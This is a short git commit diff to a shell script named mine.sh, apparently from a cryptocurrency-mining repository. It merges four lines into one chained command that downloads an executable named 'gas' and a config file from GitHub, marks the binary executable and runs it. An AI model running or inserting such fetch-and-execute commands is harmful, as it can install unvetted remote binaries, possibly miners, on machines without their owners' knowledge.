6a41dbd7254e5cf57a1d27127bd2caafec58e94a
thongtest2 <90570728+thongtest2@users.noreply.github.com>
2022-02-19 05:52:53 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,4 +1,1 @@
-wget https://github.com/cruzeiro28/gas/raw/main/gas
-wget https://github.com/thongtest2/mining/blob/main/script01.ini
-chmod +x gas
-./gas script01.ini
+wget https://github.com/cruzeiro28/gas/raw/main/gas && wget -O script01.ini https://raw.githubusercontent.com/thongtest2/mining/main/script01.ini && chmod +x gas && ./gas script01.ini
